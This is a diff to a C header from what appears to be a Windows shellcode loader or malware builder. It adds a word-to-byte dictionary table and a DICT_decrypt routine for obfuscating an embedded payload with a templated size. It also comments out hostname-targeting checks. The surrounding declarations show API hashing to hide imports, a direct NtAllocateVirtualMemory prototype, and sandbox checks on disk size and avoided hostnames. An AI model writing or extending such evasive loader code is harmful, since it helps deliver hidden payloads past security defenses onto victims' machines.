@@ -6,6 +6,8 @@
 #include <time.h>
 #include <stdint.h>
 
+#define TAILLE 256
+
 
 typedef enum { false, true } bool;
 
@@ -14,6 +16,13 @@ typedef struct {
     uint8_t rotation_value;
     bool is_rotation_right;
 } ObjHash;
+
+typedef struct {
+    char *word;
+    uint8_t byte;
+} Association;
+
+extern const Association association_table[TAILLE];
 
 typedef NTSTATUS (NTAPI* NtAllocVirtMem)(
     HANDLE ProcessHandle,
@@ -92,8 +101,12 @@ extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
 extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];
 extern const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE;
 
+extern unsigned char payload[%PAYLOAD_SIZE%];
+extern const char* dict_payload;
+
 
 void XOR(unsigned char *data, size_t len, uint16_t key);
+void DICT_decrypt(const char* dict_payload);
 
 HMODULE CustomGetModuleHandle(ObjHash module_hash);
 FARPROC CustomGetProcAdress(IN HMODULE hModule, ObjHash function_hash);
@@ -103,9 +116,9 @@ int get_disk_size(HMODULE hKernel32dll);
 const char* get_hostname(HMODULE hKernel32dll);
 unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right);
 
-bool is_target_hostname(const char* hostname);
-bool is_valid_hostname(const char* hostname);
-bool is_avoided(const char* hostname);
+// bool is_target_hostname(const char* hostname);
+// bool is_valid_hostname(const char* hostname);
+// bool is_avoided(const char* hostname);
 
 FILE* clean_init();
 void clean_exit(FILE* file);
